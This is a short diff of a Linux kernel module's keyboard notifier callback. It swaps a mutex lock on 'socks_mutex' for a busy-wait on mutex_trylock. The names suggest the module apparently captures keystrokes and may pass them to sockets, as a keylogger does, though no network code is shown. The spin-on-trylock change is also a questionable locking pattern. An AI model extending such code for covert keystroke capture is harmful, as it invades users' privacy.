@@ -51,7 +51,7 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
 
-    mutex_lock(&socks_mutex);
+    while (mutex_trylock(&socks_mutex) == 0);
 
     if (code == KBD_KEYSYM && param && param->down) {
         // Call the keyboard interrupt handler
